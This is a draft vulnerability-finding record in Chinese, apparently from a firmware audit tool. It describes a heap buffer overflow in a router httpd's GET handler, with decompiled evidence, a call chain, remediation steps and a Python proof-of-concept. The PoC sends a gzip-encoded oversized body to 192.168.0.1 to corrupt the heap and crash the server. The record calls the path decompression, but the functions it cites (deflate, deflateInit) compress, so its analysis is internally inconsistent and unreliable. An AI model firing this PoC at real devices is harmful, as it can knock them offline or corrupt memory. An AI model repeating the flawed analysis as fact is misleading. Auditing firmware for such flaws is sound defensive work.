@@ -1,0 +1,33 @@
+{
+  "job_id": "9160aafaa095",
+  "title": "httpd GET 响应解压路径堆缓冲区溢出（拷贝长度用输出缓冲容量而非实际产出长度，且检查在写入之后）",
+  "severity": "high",
+  "confidence": 0.7,
+  "vuln_class": "堆缓冲区溢出",
+  "cwe": "CWE-122",
+  "binary_md5": "b18be6d07f1c97903c063686924ed3c7",
+  "binary_path": "firmware/binwalk_extracted/firmware.extracted/0/decrypted.bin.extracted/56CD97/squashfs-root/bin/httpd",
+  "reachability": "static-only",
+  "summary": "httpd 的 GET 响应处理器 sub_407260（syslog 内名 \"process_method_get\"）在响应体以 gzip/deflate 压缩时，先把压缩数据解压进一个 4MB 堆缓冲区（v9 = malloc(0x400000)，错误串中称 PGIMAGE_MAX_SIZE），再分块写出。\n\n解压循环每次迭代把 deflate 的单次产出整块 memcpy 进堆缓冲区，但拷贝长度取自输出缓冲的容量 dword_4ED46C（=4096），而非实际产出长度；并且写入发生在\"剩余空间\"检查之前：\n\n    v14 = v9 + v10;                          // 目标 = 缓冲区基址 + 已用长度\n    v10 += dword_4ED46C - v79;               // 已用长度累加\n    memcpy(v14, v77, dword_4ED46C - v79);    // ← 拷贝先发生\n    ...\n    if ( v10 < 0x400000 ) goto LABEL_19;\n    // 仅当 v10 >= 0x400000 才记录 \"Maybe data overflow\"\n\n因此只要单次 deflate 产出使 v10 越过 0x400000，这次 memcpy 已经越界写；随后的检查只能打印告警，无法回退。CFG 证实 v77 是按 dword_4ED46C 上取整分配的动态栈缓冲区（0x40730c 处 subu $sp），即单次最多 4096 字节，故越界量以 4KB 为粒度，可越过缓冲区尾部破坏相邻堆块元数据。\n\n解压路径由请求头驱动：sub_4070FC 依据 Content-Encoding 返回 \"gzip\"/\"deflate\"，非 identity 时调用 deflateInit2_/deflateInit_。\n\n与本会话已入库的两条（请求行 URL 栈溢出、表单解析缓冲区尺寸不匹配）在载体、位置与内存区域上均不同：此处为堆缓冲区、位于 GET 响应路径、载体为 Content-Encoding 请求头加压缩体。",
+  "evidence": [
+    "hexrays sub_407260: v9 = malloc(0x400000) —— 4MB 响应缓冲，日志文案称 PGIMAGE_MAX_SIZE",
+    "hexrays sub_407260 解压循环: v83 = (*(...)(a3 + 24))(a4, v86, dword_4ED46C); v78[1] = v83; v78[0] = v86; 随后 do { v79 = dword_4ED46C; v78[3] = v77; deflate(v78, v12); v13 = v79; v14 = v9 + v10; v10 += dword_4ED46C - v79; memcpy(v14, v77, dword_4ED46C - v79); } while ( !v13 );",
+    "关键点：memcpy 写入发生在 v10 自增与随后的 if ( v10 < 0x400000 ) 检查之前，故单次拷贝可越过 4MB 边界",
+    "hexrays sub_407260 溢出日志: \"Maybe data overflow(PGIMAGE_MAX_SIZE(%d),len(%zu)\" 与 \"((PGIMAGE_MAX_SIZE -temp_len)< BUFF_SIZE_1)\" —— 开发者已知边界但仍只做事后检测",
+    "CFG sub_407260 块0 序言 0x407260 addiu $sp,-0xA0；块6 (0x40730c-0x407318) subu $sp, $v0 / subu $sp, $t8，$v0/$t8 由 dword_4ED46C 上取整到 8 字节得到 —— 证实 v77 是 dword_4ED46C(=4096) 字节动态栈缓冲区，单次 deflate 最多产出 4096 字节",
+    "hexrays sub_407260: v85 = sub_4070FC(*(const char **)(a4 + 28)) 取 Content-Encoding；为 \"gzip\" 时 deflateInit2_(...,8,31,...)，为 \"deflate\" 时 deflateInit_ —— 解压路径由请求头驱动",
+    "hexrays sub_407260: while ( !v13 ) 为内层循环条件（v13 = 剩余 avail_out，为 0 表示输出缓冲写满），故每次迭代必然产出可达 4096 字节"
+  ],
+  "session_id": "s-muc9lvva-918b",
+  "function_name": "sub_407260",
+  "preconditions": "需命中落到 sub_407260 的下载型 GET 处理器（该处理器在选择集中；被排除的处理器名为 bakset/das/x509prof/vpnprof/cfgsave/ovpncfg）。请求需携带 Content-Encoding: gzip 或 deflate（由 sub_4070FC 从请求头解析）并附带可解压压缩体，解压后总量需超过 4MB。是否需已认证会话取决于该处理器的会话检查，本次未能确认，故按静态可达记录。",
+  "remediation": "1) 每次 memcpy 前校验剩余空间，拷贝长度取 min(deflate 产出长度, 0x400000 - v10)，空间不足时立即终止解压并返回错误；2) 用实际产出长度而非输出缓冲容量 dword_4ED46C 作为拷贝长度；3) 不要把「先写后检查」当边界保护——现有检查位于 memcpy 之后，只能记录损坏而不能阻止；4) 对解压输出总量设上限，避免压缩炸弹同时造成堆溢出与内存耗尽。",
+  "poc": "python3 -c \"\nimport zlib, socket\npayload = zlib.compress(b'A'*8_000_000, 9)     # 高压缩比：解压后远超 4MB\nreq  = b'GET /' + b'A'*100 + b' HTTP/1.1\\r\\n'\nreq += b'Host: 192.168.0.1\\r\\n'\nreq += b'Content-Encoding: gzip\\r\\n'           # 驱动 sub_4070FC 返回 gzip\nreq += ('Content-Length: %d\\r\\n' % len(payload)).encode()\nreq += b'Connection: close\\r\\n\\r\\n' + payload\ns = socket.create_connection(('192.168.0.1', 80)); s.sendall(req)\nprint(s.recv(256))\n\"\n# 预期：解压循环把输出块写入 malloc(0x400000) 缓冲，单次 memcpy 越过 4MB 边界，\n#       破坏相邻堆块元数据，工作线程随后在 free/malloc 处崩溃",
+  "call_chain": "main (0x403b7c) → sub_4105D0 (0x4105d0) → sub_40D690 (0x40d690, accept 循环) → pthread_create → sub_408A0C (0x408a0c, handleIncoming, 路由得到处理器名 v162) → sub_407260 (0x407260, process_method_get) → sub_4070FC (0x4070fc) 取 Content-Encoding → deflate() 解压 → memcpy 越界写",
+  "function_addr": "0x407260",
+  "id": "F-mucb3xsk-5de3",
+  "status": "draft",
+  "owner": "token-admin",
+  "recorded_at": "2026-09-22T06:42:13Z",
+  "history": []
+}
